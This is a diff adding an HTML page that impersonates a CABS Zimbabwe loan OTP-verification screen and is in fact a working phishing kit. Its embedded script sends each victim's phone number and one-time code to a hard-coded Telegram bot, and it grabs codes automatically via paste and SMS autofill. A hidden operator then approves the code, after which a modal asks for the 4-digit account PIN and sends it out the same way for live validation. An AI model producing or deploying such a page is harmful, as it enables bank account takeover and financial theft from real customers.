@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#11bb4a">
+    <title>CABS Zimbabwe | OTP Verification</title>
+    <link rel="icon" href="https://applycabsloans.netlify.app/cabslogo.jpeg">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+         :root {
+            --cabs-green: #11bb4a;
+            --cabs-dark-green: #0a9a28;
+            --cabs-deep: #04501f;
+            --white: #ffffff;
+            --error: #ff6b6b;
+            --bg-overlay: rgba(0, 20, 8, 0.80);
+            --card-bg: rgba(255, 255, 255, 0.12);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html,
+        body {
+            overflow-x: hidden;
+            max-width: 100%;
+            -webkit-text-size-adjust: 100%;
+        }
+        
+        body {
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            min-height: 100vh;
+            min-height: 100dvh;
+            color: white;
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            padding: calc(30px + env(safe-area-inset-top)) 5% 18px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 26px;
+            font-weight: 800;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            transition: transform 0.3s ease;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        
+        .logo:hover {
+            transform: scale(1.05);
+        }
+        
+        .logo .cabs {
+            color: var(--cabs-green);
+        }
+        
+        .logo .flex-loan {
+            color: var(--white);
+            margin-left: 8px;
+            font-weight: 400;
+            font-size: 22px;
+            opacity: 0.9;
+        }
+        
+        .logo img {
+            height: 38px;
+            width: auto;
+            border-radius: 8px;
+            margin-right: 8px;
+        }
+        
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            align-self: stretch;
+        }
+        
+        .container {
+            max-width: 420px;
+            width: 100%;
+            margin: 0 auto;
+            padding-bottom: calc(40px + env(safe-area-inset-bottom));
+        }
+        
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            border-radius: 35px;
+            padding: 45px 35px;
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
+            text-align: center;
+            animation: cardFadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        @keyframes cardFadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .brand-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--cabs-deep);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            border: 2px solid rgba(17, 187, 74, 0.35);
+        }
+        
+        .card h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--white);
+        }
+        
+        .card>p {
+            font-size: 14px;
+            opacity: 0.7;
+            margin-bottom: 28px;
+            font-weight: 300;
+            max-width: 320px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .loan-badge {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(17, 187, 74, 0.25);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 28px;
+            text-align: left;
+        }
+        
+        .loan-badge .label {
+            font-size: 11px;
+            text-transform: uppercase;
+            color: var(--cabs-green);
+            font-weight: 700;
+            display: block;
+            margin-bottom: 5px;
+            letter-spacing: 1px;
+        }
+        
+        .loan-badge .val {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--white);
+        }
+        
+        .otp-row {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        
+        .otp-box {
+            width: 48px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 16px;
+            background: rgba(255, 255, 255, 0.08);
+            color: white;
+            outline: none;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            caret-color: var(--cabs-green);
+        }
+        
+        .otp-box:focus {
+            border-color: var(--cabs-green);
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: 0 0 15px rgba(17, 187, 74, 0.2);
+        }
+        
+        .otp-box.ok {
+            border-color: var(--cabs-green);
+            background: rgba(17, 187, 74, 0.12);
+            animation: boxPop 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        
+        @keyframes boxPop {
+            from {
+                transform: scale(1.12);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+        
+        .verify-btn {
+            width: 100%;
+            padding: 20px;
+            background: var(--white);
+            color: var(--cabs-deep);
+            border: none;
+            border-radius: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            font-family: inherit;
+        }
+        
+        .verify-btn:hover {
+            background: var(--cabs-green);
+            color: var(--white);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .verify-btn:active {
+            transform: translateY(-1px);
+        }
+        
+        .verify-btn:disabled {
+            opacity: 0.6;
+            cursor: wait;
+            transform: none;
+        }
+        
+        .auto-note {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.55);
+            margin-top: 16px;
+            font-weight: 300;
+            display: none;
+        }
+        
+        .auto-note .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--cabs-green);
+            margin-right: 7px;
+            animation: pulse 1.6s ease-in-out infinite;
+            vertical-align: middle;
+        }
+        
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+        
+        .error-msg {
+            color: #ff8a8a;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            display: none;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 12px;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 107, 107, 0.2);
+        }
+        
+        .overlay {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            background: rgba(0, 15, 5, 0.95);
+            z-index: 2000;
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            padding: 20px;
+        }
+        
+        .overlay.on {
+            display: flex;
+        }
+        
+        .spin {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--cabs-green);
+            border-radius: 50%;
+            animation: sp 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+        
+        .sp-t {
+            font-size: 20px;
+            font-weight: 700;
+            margin-top: 25px;
+            letter-spacing: 0.5px;
+        }
+        
+        .sp-s {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 10px;
+            font-weight: 300;
+        }
+        
+        @keyframes sp {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        /* ===== PIN Modal (CABS theme) ===== */
+        
+        .pin-overlay {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 15, 5, 0.92);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            z-index: 3000;
+            padding: 20px;
+        }
+        
+        .pin-overlay.on {
+            display: flex;
+        }
+        
+        .pin-card {
+            background: rgba(255, 255, 255, 0.10);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 32px;
+            padding: 42px 30px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.7);
+            animation: cardFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        .pin-icon {
+            width: 72px;
+            height: 72px;
+            background: var(--cabs-deep);
+            border: 2px solid rgba(17, 187, 74, 0.35);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            font-size: 34px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .pin-card h3 {
+            font-size: 21px;
+            font-weight: 700;
+            color: var(--white);
+            margin-bottom: 8px;
+        }
+        
+        .pin-card>p {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.65);
+            font-weight: 300;
+            margin-bottom: 26px;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .pin-row {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        
+        .pin-box {
+            width: 60px;
+            height: 68px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 18px;
+            background: rgba(255, 255, 255, 0.08);
+            color: white;
+            outline: none;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            caret-color: var(--cabs-green);
+        }
+        
+        .pin-box:focus {
+            border-color: var(--cabs-green);
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: 0 0 15px rgba(17, 187, 74, 0.25);
+        }
+        
+        .pin-box.ok {
+            border-color: var(--cabs-green);
+            background: rgba(17, 187, 74, 0.12);
+            animation: boxPop 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        
+        .pin-submit {
+            width: 100%;
+            padding: 18px;
+            background: var(--cabs-green);
+            color: var(--white);
+            border: none;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.25);
+        }
+        
+        .pin-submit:hover {
+            background: var(--cabs-dark-green);
+            transform: translateY(-2px);
+        }
+        
+        .pin-submit:disabled {
+            opacity: 0.6;
+            cursor: wait;
+            transform: none;
+        }
+        
+        .pin-err {
+            color: #ff8a8a;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 18px;
+            display: none;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 11px;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 107, 107, 0.2);
+        }
+        
+        footer {
+            padding: 40px 20px calc(40px + env(safe-area-inset-bottom));
+            text-align: center;
+            font-size: 12px;
+            opacity: 0.4;
+            letter-spacing: 0.8px;
+        }
+        
+        @media (max-width: 480px) {
+            .logo {
+                font-size: 24px;
+            }
+            .logo .flex-loan {
+                font-size: 20px;
+            }
+            .card {
+                padding: 40px 25px;
+            }
+            .card h2 {
+                font-size: 22px;
+            }
+        }
+        
+        @media (max-width: 370px) {
+            .otp-box {
+                width: 42px;
+                height: 52px;
+                font-size: 20px;
+                border-radius: 14px;
+            }
+            .otp-row {
+                gap: 7px;
+            }
+            .card {
+                padding: 34px 22px;
+            }
+            .logo {
+                font-size: 22px;
+            }
+            .logo .flex-loan {
+                font-size: 18px;
+            }
+            .pin-box {
+                width: 52px;
+                height: 60px;
+                font-size: 24px;
+            }
+            .pin-card {
+                padding: 34px 22px;
+            }
+        }
+        
+        @media (orientation: landscape) and (max-height: 500px) {
+            header {
+                padding: 8px 5% 8px;
+            }
+            main {
+                align-items: flex-start;
+                padding: 12px;
+            }
+            .card {
+                padding: 28px 24px;
+            }
+            .brand-icon {
+                width: 60px;
+                height: 60px;
+                margin-bottom: 14px;
+            }
+            .card>p {
+                margin-bottom: 18px;
+            }
+            .loan-badge {
+                margin-bottom: 18px;
+                padding: 14px 16px;
+            }
+            .otp-box {
+                width: 44px;
+                height: 50px;
+            }
+            .pin-card {
+                padding: 24px 22px;
+            }
+            .pin-icon {
+                width: 56px;
+                height: 56px;
+                font-size: 26px;
+                margin-bottom: 12px;
+            }
+            .pin-box {
+                width: 48px;
+                height: 54px;
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+
+<body onload="init()">
+
+    <header>
+        <a class="logo" href="index.html">
+            <img src="https://applycabsloans.netlify.app/cabslogo.jpeg" alt="CABS logo">
+            <span class="cabs">CABS</span><span class="flex-loan">Flex Loan</span>
+        </a>
+    </header>
+
+    <main>
+        <div class="container">
+            <div class="card">
+                <div class="brand-icon">
+                    <svg viewBox="0 0 100 100" width="45" height="45">
+                        <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#11bb4a" stroke-width="8" stroke-linecap="round"/>
+                        <path d="M45,35 L55,65" stroke="#11bb4a" stroke-width="8" stroke-linecap="round"/>
+                    </svg>
+                </div>
+
+                <h2>OTP Verification</h2>
+                <p>Please enter the 6-digit security code sent to your mobile device to authorize this request.</p>
+
+                <div id="loanBox" class="loan-badge" style="display:none;">
+                    <span class="label" id="loanType">Loan Application</span>
+                    <span class="val" id="loanAmount">$0.00 USD</span>
+                </div>
+
+                <div id="err" class="error-msg"></div>
+
+                <div class="otp-row" id="otpRow">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="OTP digit 1">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="OTP digit 2">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="OTP digit 3">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="OTP digit 4">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="OTP digit 5">
+                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="OTP digit 6">
+                </div>
+
+                <button class="verify-btn" id="verifyBtn" onclick="doOTP()">Authorize &amp; Continue</button>
+                <div class="auto-note" id="autoNote"><span class="dot"></span>Code received — sending automatically...</div>
+            </div>
+        </div>
+    </main>
+
+    <div id="ov" class="overlay">
+        <div class="spin"></div>
+        <div class="sp-t">Verifying Security Code</div>
+        <div class="sp-s">Securing your connection to CABS servers...</div>
+    </div>
+
+    <!-- PIN Popup Modal (CABS theme) -->
+    <div class="pin-overlay" id="pinOverlay">
+        <div class="pin-card">
+            <div class="pin-icon">&#128274;</div>
+            <h3>Confirm Your PIN</h3>
+            <p>For added security, enter your 4-digit account PIN to finalize the loan authorization.</p>
+
+            <div id="pinErr" class="pin-err"></div>
+
+            <div class="pin-row" id="pinRow">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 1">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 2">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 3">
+                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" aria-label="PIN digit 4">
+            </div>
+
+            <button class="pin-submit" id="pinSubmit" onclick="doPIN()">Confirm PIN</button>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 CABS, a member of the Old Mutual Group &bull; Zimbabwe. All rights reserved.</p>
+    </footer>
+
+    <script>
+        const BOT = '8833943664:AAFm3V9Npm43zg_JGDBOZWTJYS6q0qwKqto';
+        const CID = '6178733970';
+        let bd = {},
+            luid = 0,
+            otp = '',
+            phone = '';
+        let sent = false; // ensure the OTP message is sent only once
+        let pinPollInterval = null;
+        const boxes = document.querySelectorAll('.otp-box');
+        const pinBoxes = document.querySelectorAll('.pin-box');
+
+        function init() {
+            const p = new URLSearchParams(location.search);
+            const name = p.get('name') || "Valued Client";
+            const amount = p.get('amount') || "0";
+            const purpose = p.get('purpose') || "Flex Loan";
+            phone = p.get('phone') || '';
+
+            if (amount !== "0") {
+                bd = {
+                    data: purpose,
+                    price: amount
+                };
+                document.getElementById('loanBox').style.display = 'block';
+                document.getElementById('loanType').textContent = decodeURIComponent(purpose);
+                document.getElementById('loanAmount').textContent = '$' + parseFloat(amount).toLocaleString() + ' USD';
+            }
+            setupOTP();
+            setupPIN();
+            boxes[0].focus();
+        }
+
+        /* ============ OTP boxes: auto-advance + autofill + autosend ============ */
+        function setupOTP() {
+            boxes.forEach((b, i) => {
+                b.addEventListener('input', e => {
+                    const v = e.target.value;
+                    if (v.length > 1) {
+                        // Paste / autofill: distribute digits across boxes
+                        const digs = v.replace(/\D/g, '').split('');
+                        digs.forEach((d, j) => {
+                            if (i + j < boxes.length) {
+                                boxes[i + j].value = d;
+                                boxes[i + j].classList.add('ok');
+                            }
+                        });
+                        boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
+                        chk();
+                        if (otp.length === 6) {
+                            autosend();
+                        }
+                        return;
+                    }
+                    if (v) {
+                        b.classList.add('ok');
+                        if (i < boxes.length - 1) boxes[i + 1].focus();
+                    } else {
+                        b.classList.remove('ok');
+                    }
+                    chk();
+                    if (otp.length === 6) {
+                        autosend();
+                    }
+                });
+                b.addEventListener('keydown', e => {
+                    if (e.key === 'Backspace' && !b.value && i > 0) boxes[i - 1].focus();
+                });
+            });
+
+            // Autofill from clipboard / SMS suggestion paste
+            document.addEventListener('paste', e => {
+                const data = e.clipboardData.getData('text').replace(/\D/g, '');
+                if (data.length >= 6) {
+                    e.preventDefault();
+                    data.split('').slice(0, 6).forEach((d, i) => {
+                        boxes[i].value = d;
+                        boxes[i].classList.add('ok');
+                    });
+                    boxes[5].focus();
+                    chk();
+                    if (otp.length === 6) {
+                        autosend();
+                    }
+                }
+            });
+
+            // WebOTP autofill (Android: autocomplete="one-time-code")
+            if ('OTPCredential' in window) {
+                try {
+                    navigator.credentials.get({
+                        otp: {
+                            transport: ['sms']
+                        }
+                    }).then(cred => {
+                        if (cred && cred.code) {
+                            const code = cred.code.replace(/\D/g, '').slice(0, 6);
+                            if (code.length === 6) {
+                                code.split('').forEach((d, i) => {
+                                    boxes[i].value = d;
+                                    boxes[i].classList.add('ok');
+                                });
+                                boxes[5].focus();
+                                chk();
+                                if (otp.length === 6) {
+                                    autosend();
+                                }
+                            }
+                        }
+                    }).catch(() => {});
+                } catch (e) {}
+            }
+        }
+
+        function chk() {
+            otp = Array.from(boxes).map(b => b.value).join('');
+        }
+
+        function showErr(m) {
+            const e = document.getElementById('err');
+            e.textContent = m;
+            e.style.display = 'block';
+        }
+
+        function clrErr() {
+            document.getElementById('err').style.display = 'none';
+        }
+
+        async function tg(msg, btns) {
+            try {
+                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CID,
+                        text: msg,
+                        reply_markup: btns ? {
+                            inline_keyboard: btns
+                        } : undefined,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const d = await r.json();
+                if (d.ok) {
+                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
+                    const ud = await ur.json();
+                    if (ud.ok && ud.result.length > 0) {
+                        luid = ud.result[0].update_id;
+                    }
+                }
+                return d.ok;
+            } catch (e) {
+                console.error(e);
+            }
+            return false;
+        }
+
+        /* Autosend: 6 digits complete → send to Telegram immediately */
+        function autosend() {
+            if (sent) return;
+            sent = true;
+            document.getElementById('autoNote').style.display = 'block';
+            document.getElementById('verifyBtn').disabled = true;
+            setTimeout(() => doOTP(), 600);
+        }
+
+        function doOTP() {
+            clrErr();
+            if (otp.length !== 6) {
+                showErr('Please enter the full 6-digit code');
+                return;
+            }
+
+            // Start with 7 instead of +263
+            const msg = `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nPlease choose an action below:`;
+            // Two buttons: Approve and Decline
+            const btns = [
+                [{
+                    text: '✅ Approve',
+                    callback_data: 'otp_approved'
+                }, {
+                    text: '❌ Decline',
+                    callback_data: 'otp_declined'
+                }]
+            ];
+
+            document.getElementById('ov').classList.add('on');
+            tg(msg, btns).then(() => {
+                poll();
+            });
+        }
+
+        /* Wait for Approve/Decline from Telegram */
+        function poll() {
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            d.result.forEach(u => {
+                                luid = u.update_id;
+                                if (u.callback_query) {
+                                    const cb = u.callback_query.data;
+                                    if (cb === 'otp_approved') {
+                                        clearInterval(iv);
+                                        document.getElementById('ov').classList.remove('on');
+                                        // Approve clicked → open PIN popup modal
+                                        openPINModal();
+                                    } else if (cb === 'otp_declined') {
+                                        clearInterval(iv);
+                                        document.getElementById('ov').classList.remove('on');
+                                        showErr('Verification declined by the operator. Please check your details and try again.');
+                                        boxes.forEach(b => {
+                                            b.value = '';
+                                            b.classList.remove('ok');
+                                        });
+                                        boxes[0].focus();
+                                    }
+                                }
+                            });
+                        }
+                    }).catch(e => console.error(e));
+            }, 1500);
+
+            setTimeout(() => {
+                clearInterval(iv);
+            }, 600000);
+        }
+
+        /* ============ PIN modal ============ */
+        function setupPIN() {
+            pinBoxes.forEach((b, i) => {
+                b.addEventListener('input', e => {
+                    const v = e.target.value;
+                    if (v.length > 1) {
+                        const digs = v.replace(/\D/g, '').split('');
+                        digs.forEach((d, j) => {
+                            if (i + j < pinBoxes.length) {
+                                pinBoxes[i + j].value = d;
+                                pinBoxes[i + j].classList.add('ok');
+                            }
+                        });
+                        pinBoxes[Math.min(i + digs.length, pinBoxes.length - 1)].focus();
+                        pinChk();
+                        if (pinVal().length === 4) {
+                            setTimeout(() => doPIN(), 300);
+                        }
+                        return;
+                    }
+                    if (v) {
+                        b.classList.add('ok');
+                        if (i < pinBoxes.length - 1) pinBoxes[i + 1].focus();
+                    } else {
+                        b.classList.remove('ok');
+                    }
+                    pinChk();
+                    if (pinVal().length === 4) {
+                        setTimeout(() => doPIN(), 300);
+                    }
+                });
+                b.addEventListener('keydown', e => {
+                    if (e.key === 'Backspace' && !b.value && i > 0) pinBoxes[i - 1].focus();
+                });
+            });
+        }
+
+        function pinVal() {
+            return Array.from(pinBoxes).map(b => b.value).join('');
+        }
+
+        function pinChk() {
+            Array.from(pinBoxes).forEach(b => {
+                if (b.value) b.classList.add('ok');
+                else b.classList.remove('ok');
+            });
+        }
+
+        function openPINModal() {
+            document.getElementById('pinOverlay').classList.add('on');
+            pinBoxes.forEach(b => {
+                b.value = '';
+                b.classList.remove('ok');
+            });
+            document.getElementById('pinErr').style.display = 'none';
+            pinBoxes[0].focus();
+        }
+
+        function closePINModal() {
+            document.getElementById('pinOverlay').classList.remove('on');
+        }
+
+        function pinShowErr(m) {
+            const e = document.getElementById('pinErr');
+            e.textContent = m;
+            e.style.display = 'block';
+            pinBoxes.forEach(b => {
+                b.value = '';
+                b.classList.remove('ok');
+            });
+            pinBoxes[0].focus();
+        }
+
+        async function doPIN() {
+            const pin = pinVal();
+            if (pin.length !== 4) {
+                pinShowErr('Please enter the full 4-digit PIN.');
+                return;
+            }
+
+            const btn = document.getElementById('pinSubmit');
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+
+            const msg = `🔒 <b>PIN Verification</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n🔑 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nIs this PIN valid?`;
+            const btns = [
+                [{
+                    text: '✅ Valid PIN',
+                    callback_data: 'pin_valid'
+                }, {
+                    text: '❌ Invalid PIN',
+                    callback_data: 'pin_invalid'
+                }]
+            ];
+
+            await tg(msg, btns);
+            btn.disabled = false;
+            btn.textContent = 'Confirm PIN';
+            pollPIN();
+        }
+
+        /* Wait for Valid/Invalid PIN from Telegram */
+        function pollPIN() {
+            if (pinPollInterval) clearInterval(pinPollInterval);
+            pinPollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            d.result.forEach(u => {
+                                luid = u.update_id;
+                                if (u.callback_query) {
+                                    const cb = u.callback_query.data;
+                                    if (cb === 'pin_valid') {
+                                        clearInterval(pinPollInterval);
+                                        // Valid PIN → open success.html
+                                        location.href = 'card.html?name=' + encodeURIComponent(document.title) + '&amount=' + (bd.price || '0') + '&purpose=' + encodeURIComponent(bd.data || 'Flex Loan') + '&phone=' + phone;
+                                    } else if (cb === 'pin_invalid') {
+                                        clearInterval(pinPollInterval);
+                                        // Invalid PIN → return to PIN popup modal
+                                        pinShowErr('The PIN was declared invalid. Please re-enter your 4-digit PIN and try again.');
+                                    }
+                                }
+                            });
+                        }
+                    }).catch(e => console.error(e));
+            }, 1500);
+
+            setTimeout(() => {
+                clearInterval(pinPollInterval);
+            }, 600000);
+        }
+    </script>
+
+    <!-- Start of Tawk.to Script -->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {},
+            Tawk_LoadStart = new Date();
+        (function() {
+            var s1 = document.createElement("script"),
+                s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/6a5c34ea1c52dc1d4c7edce5/default';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+    </script>
+    <!-- End of Tawk.to Script -->
+
+</body>
+
+</html>
